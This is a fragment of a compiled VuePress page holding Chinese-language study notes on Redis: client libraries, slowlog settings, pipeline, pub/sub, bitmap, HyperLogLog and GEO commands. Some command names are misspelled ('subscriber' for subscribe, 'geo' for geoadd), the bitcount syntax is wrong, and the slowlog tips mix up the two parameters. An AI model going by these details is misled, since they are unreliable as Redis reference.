\"),t(\"ul\",[t(\"li\",[s._v(\"排名榜\")])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"客户端\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#客户端\"}},[s._v(\"#\")]),s._v(\" 客户端\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"参考：https-redis-io-clients\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#参考：https-redis-io-clients\"}},[s._v(\"#\")]),s._v(\" 参考：\"),t(\"a\",{attrs:{href:\"https://redis.io/clients\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://redis.io/clients\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"h3\",{attrs:{id:\"jedis\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#jedis\"}},[s._v(\"#\")]),s._v(\" Jedis\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"参考：https-github-com-xetorthio-jedis\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#参考：https-github-com-xetorthio-jedis\"}},[s._v(\"#\")]),s._v(\" 参考：\"),t(\"a\",{attrs:{href:\"https://github.com/xetorthio/jedis\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://github.com/xetorthio/jedis\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"h3\",{attrs:{id:\"redis-py\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis-py\"}},[s._v(\"#\")]),s._v(\" redis-py\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"参考：https-github-com-andymccurdy-redis-py\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#参考：https-github-com-andymccurdy-redis-py\"}},[s._v(\"#\")]),s._v(\" 参考：\"),t(\"a\",{attrs:{href:\"https://github.com/andymccurdy/redis-py\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://github.com/andymccurdy/redis-py\"),t(\"OutboundLink\")],1)]),s._v(\" \"),t(\"h3\",{attrs:{id:\"redigo\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redigo\"}},[s._v(\"#\")]),s._v(\" redigo\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"参考：\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#参考：\"}},[s._v(\"#\")]),s._v(\" 参考：\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[t(\"p\",[t(\"a\",{attrs:{href:\"https://github.com/gomodule/redigo\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://github.com/gomodule/redigo\"),t(\"OutboundLink\")],1)])]),s._v(\" \"),t(\"li\",[t(\"p\",[t(\"a\",{attrs:{href:\"https://godoc.org/github.com/gomodule/redigo/redis\",target:\"_blank\",rel:\"noopener noreferrer\"}},[s._v(\"https://godoc.org/github.com/gomodule/redigo/redis\"),t(\"OutboundLink\")],1)])])]),s._v(\" \"),t(\"h2\",{attrs:{id:\"应用\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#应用\"}},[s._v(\"#\")]),s._v(\" 应用\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"慢查询\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#慢查询\"}},[s._v(\"#\")]),s._v(\" 慢查询\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"生命周期\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#生命周期\"}},[s._v(\"#\")]),s._v(\" 生命周期\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"发送命令\")]),s._v(\" \"),t(\"li\",[s._v(\"排队\")]),s._v(\" \"),t(\"li\",[s._v(\"执行命令\")]),s._v(\" \"),t(\"li\",[s._v(\"返回结果\")])]),s._v(\" \"),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"慢查询发送在第 3 阶段\")]),s._v(\" \"),t(\"p\",[s._v(\"客户端超时不一定慢查询，但慢查询是客户端超时的一个可能因素\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"配置\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#配置\"}},[s._v(\"#\")]),s._v(\" 配置\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"slowlog-max-len\")])]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"先进先出队列\")]),s._v(\" \"),t(\"li\",[s._v(\"固定长度\")]),s._v(\" \"),t(\"li\",[s._v(\"保存在内存内\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"slowlog-log-slower-than\")])]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"慢查询阈值（单位：微秒）\")]),s._v(\" \"),t(\"li\",[s._v(\"slowlog-log-slower-than=0, 记录所有命令\")]),s._v(\" \"),t(\"li\",[s._v(\"slowlog-log-slower-than<0, 不记录任何命令\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"配置方法\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#配置方法\"}},[s._v(\"#\")]),s._v(\" 配置方法\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"默认值\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"config get slowlog-max-len = 128\")]),s._v(\" \"),t(\"li\",[s._v(\"config get slowlog-log-slower-than = 10000\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"修改配置文件重启\")]),s._v(\" \"),t(\"li\",[s._v(\"动态配置\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"config set slowlog-max-len 1000\")]),s._v(\" \"),t(\"li\",[s._v(\"config set slowlog-log-slower-than 1000\")])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"命令\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#命令\"}},[s._v(\"#\")]),s._v(\" 命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取慢查询队列\")]),s._v(\"\\nslowlog get \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"n\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取慢查询队列长度\")]),s._v(\"\\nslowlog len\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#清空慢查询队列\")]),s._v(\"\\nslowlog reset\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"运维经验\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#运维经验\"}},[s._v(\"#\")]),s._v(\" 运维经验\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"slowlog-max-len 不要设置过大，默认 10ms，通常设置 1ms\")]),s._v(\" \"),t(\"li\",[s._v(\"slowlog-log-slower-than 不要设置过小，通常设置 1000 左右\")]),s._v(\" \"),t(\"li\",[s._v(\"理解命令生命周期\")]),s._v(\" \"),t(\"li\",[s._v(\"定期持久化慢查询\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"pipeline\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#pipeline\"}},[s._v(\"#\")]),s._v(\" pipeline\")]),s._v(\" \"),t(\"p\",[s._v(\"流水线\")]),s._v(\" \"),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"注意每次 pipeline 携带数据量\")]),s._v(\" \"),t(\"p\",[s._v(\"pipeline 每次只能作用在一个 Redis 节点上\")]),s._v(\" \"),t(\"p\",[s._v(\"M 操作与 pipeline 区别\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"发布订阅\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#发布订阅\"}},[s._v(\"#\")]),s._v(\" 发布订阅\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"角色\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#角色\"}},[s._v(\"#\")]),s._v(\" 角色\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[t(\"p\",[s._v(\"发布者(publisher)\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"订阅者(subscriber)\")])]),s._v(\" \"),t(\"li\",[t(\"p\",[s._v(\"频道(channel)\")])])]),s._v(\" \"),t(\"h4\",{attrs:{id:\"模型\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#模型\"}},[s._v(\"#\")]),s._v(\" 模型\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"命令-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#命令-2\"}},[s._v(\"#\")]),s._v(\" 命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#publisher\")]),s._v(\"\\npublish channel message\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#subscriber 一个或多个\")]),s._v(\"\\nsubscriber \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"channel\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#unsubscriber 一个或多个\")]),s._v(\"\\nunsubscriber \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"channel\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#订阅模式\")]),s._v(\"\\npsubscriber \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"pattern\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#退订指定的模式\")]),s._v(\"\\npunsubscriber \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"pattern\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#列出至少有一个订阅者的频道\")]),s._v(\"\\npubsub channels\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#列出给定频道的订阅者数量\")]),s._v(\"\\npubsub numsub \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"channel\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"消息队列\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#消息队列\"}},[s._v(\"#\")]),s._v(\" 消息队列\")]),s._v(\" \"),t(\"h3\",{attrs:{id:\"bitmap\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#bitmap\"}},[s._v(\"#\")]),s._v(\" bitmap\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"位图\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#位图\"}},[s._v(\"#\")]),s._v(\" 位图\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"命令-3\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#命令-3\"}},[s._v(\"#\")]),s._v(\" 命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#给位图指定索引设置值\")]),s._v(\"\\nsetbit key offset value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取位图指定索引的值\")]),s._v(\"\\ngetbit key offset\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取位图指定范围(start到end，单位为字节，如果不指定就是获取全部)位值为1的个数\")]),s._v(\"\\nbitcount key \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"key end\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#做多个Bitmap的and(交集)、or(并集)、not(非)、xor(异或)操作并将结果保存在destkey中\")]),s._v(\"\\nbitop \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"op\")]),s._v(\" destkey key \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"key\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#计算位图指定范围(start到end，单位为字节，如果不指定就是获取全部)第一个偏移量对应的值等于targetBit的位置\")]),s._v(\"\\nbitpos key targetBit \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"start\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"end\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"独立用户统计\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#独立用户统计\"}},[s._v(\"#\")]),s._v(\" 独立用户统计\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"使用 set 和 Bitmap\")]),s._v(\" \"),t(\"li\",[s._v(\"1 亿用户，5 千万独立\")])]),s._v(\" \"),t(\"table\",[t(\"thead\",[t(\"tr\",[t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"数据类型\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"每个 userid 占用空间\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"需要存储的用户量\")]),s._v(\" \"),t(\"th\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"全部内存量\")])])]),s._v(\" \"),t(\"tbody\",[t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"set\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"32 位(假设 userid 用的是整型，实际很多网站用的是长整型)\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"1000000\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"32 位 * 1000000 = 4MB\")])]),s._v(\" \"),t(\"tr\",[t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"Bitmap\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"1 位\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"100000000\")]),s._v(\" \"),t(\"td\",{staticStyle:{\"text-align\":\"center\"}},[s._v(\"1 位 * 100000000 = 12.5MB\")])])])]),s._v(\" \"),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"type=string，最大 512MB\")]),s._v(\" \"),t(\"p\",[s._v(\"注意 setbit 时的偏移量，可能有较大耗时\")]),s._v(\" \"),t(\"p\",[s._v(\"位图不是绝对好\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"hyperloglog\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#hyperloglog\"}},[s._v(\"#\")]),s._v(\" hyperloglog\")]),s._v(\" \"),t(\"p\",[s._v(\"基于 HyperLogLog 算法：极小空间完成独立数量统计。本质还是字符串。\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"命令-4\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#命令-4\"}},[s._v(\"#\")]),s._v(\" 命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#向hyperloglog添加元素\")]),s._v(\"\\npfadd key element \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"element \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#计算hyperloglog的独立总数\")]),s._v(\"\\npfcount key \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"key \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#合并多个hyperloglog\")]),s._v(\"\\npfmerge destkey sourcekey \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"sourcekey \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"geo\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#geo\"}},[s._v(\"#\")]),s._v(\" geo\")]),s._v(\" \"),t(\"p\",[s._v(\"GEO(地理信息定位)：存储经纬度，计算两地距离，范围计算等\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"命令-5\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#命令-5\"}},[s._v(\"#\")]),s._v(\" 命令\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#增加地理位置信息\")]),s._v(\"\\ngeo key longitude latitude member \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"longitude latitude member \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取地理位置信息\")]),s._v(\"\\ngeopos key member \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"member \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取两个地理位置的距离\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#unit: m(米) km(千米) mi(英里) ft(尺)\")]),s._v(\"\\ngeodist key member1 member2 \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"unit\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取指定位置范围内的地理位置信息集合\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#withcoord：返回结果中包含经纬度\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#withdist：返回结果中包含距离中心节点位置\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#withhash：返回结果中包含geohash\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#COUNT count：指定返回结果的数量\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#asc|desc：返回结果按照距离中心节点的距离做升序或者降序\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#store key：将返回结果的地理位置信息保存到指定键\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#storedist key：将返回结果距离中心节点的距离保存到指定键\")]),s._v(\"\\ngeoradius key longitude latitude radiusm\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"km\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"ft\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"mi \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"withcoord\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"withdist\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"withhash\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"COUNT count\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"asc\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"desc\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"store key\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"storedist key\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\\ngeoradiusbymember key member radiusm\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"km\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"ft\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"mi \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"withcoord\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"withdist\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"withhash\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"COUNT count\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"asc\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"desc\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"store key\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"storedist key\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\")])]),s._v(\" 